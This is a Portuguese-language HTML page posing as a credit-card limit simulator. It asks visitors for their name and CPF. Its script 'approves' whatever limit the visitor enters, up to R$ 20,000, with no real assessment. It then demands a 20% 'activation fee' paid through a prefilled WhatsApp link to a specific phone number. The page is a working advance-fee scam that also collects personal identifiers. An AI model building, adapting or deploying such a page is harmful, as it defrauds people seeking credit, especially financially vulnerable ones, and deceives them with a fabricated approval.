<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simulador de Crédito | Trampos do Bigode</title>
    <style>
        :root { --bg: #0a0a0a; --card: #141414; --red: #ff2e2e; --text: #ffffff; --green: #00e676; }
        body { font-family: sans-serif; background-color: var(--bg); color: var(--text); padding: 20px; display: flex; justify-content: center; }
        .container { max-width: 400px; width: 100%; background: var(--card); border: 1px solid #333; padding: 25px; border-radius: 20px; text-align: center; }
        
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #000; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: var(--red); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #d32f2f; }
        
        #resultado { display: none; margin-top: 20px; }
        .btn-pagar { display: block; background: var(--green); color: black; padding: 15px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>

<div class="container" id="tela-inicial">
    <h1>Simulador de Crédito</h1>
    <p>Preencha os dados e escolha o limite desejado:</p>
    <input type="text" id="nome" placeholder="Seu Nome">
    <input type="text" id="cpf" placeholder="Seu CPF">
    <input type="number" id="limite-desejado" placeholder="Limite desejado (R$)" min="1" max="20000">
    <p style="font-size: 11px; color: #888; margin-top: -5px; margin-bottom: 10px;">Limite máximo permitido: R$ 20.000,00</p>
    <button onclick="simular()">SIMULAR AGORA</button>
</div>

<div class="container" id="resultado">
    <h2>Análise Concluída!</h2>
    <p>Olá <span id="nome-user"></span>, seu limite aprovado é de:</p>
    <div id="valor-limite" style="font-size: 28px; font-weight: bold; color: var(--green); margin: 10px 0;"></div>
    <p>Para liberar, pague a taxa de ativação de 20%:</p>
    <div id="valor-taxa" style="font-size: 24px; color: var(--red); font-weight: bold; margin-bottom: 15px;"></div>
    <a id="link-pagamento" href="#" class="btn-pagar">PAGAR TAXA DE LIBERAÇÃO</a>
    <a href="cartao.html" style="color: #666; display: block; margin-top: 20px; font-size: 12px;">Nova Simulação</a>
</div>

<script>
    function simular() {
        const nome = document.getElementById('nome').value.trim();
        const limiteInput = parseFloat(document.getElementById('limite-desejado').value);

        if (nome === "") { 
            alert("Por favor, preencha seu nome!"); 
            return; 
        }

        if (isNaN(limiteInput) || limiteInput <= 0) {
            alert("Digite um valor de limite válido!");
            return;
        }

        if (limiteInput > 20000) {
            alert("O limite máximo para simulação é de R$ 20.000,00!");
            return;
        }

        // Calcula a taxa de 20% sobre o limite que o usuário digitou
        const limite = limiteInput.toFixed(2);
        const taxa = (limiteInput * 0.20).toFixed(2);

        // Formatação de valores para moeda brasileira
        const limiteFormatado = parseFloat(limite).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        const taxaFormatada = parseFloat(taxa).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

        document.getElementById('nome-user').innerText = nome;
        document.getElementById('valor-limite').innerText = "R$ " + limiteFormatado;
        document.getElementById('valor-taxa').innerText = "R$ " + taxaFormatada;

        document.getElementById('tela-inicial').style.display = "none";
        document.getElementById('resultado').style.display = "block";

        const link = "https://wa.me/5532987252649?text=Olá Bigode! Meu nome é " + encodeURIComponent(nome) + ". Simulei o cartão com limite de R$ " + limiteFormatado + ". Quero pagar os 20% (R$ " + taxaFormatada + ") para liberar.";
        document.getElementById('link-pagamento').href = link;
    }
</script>

</body>
</html>
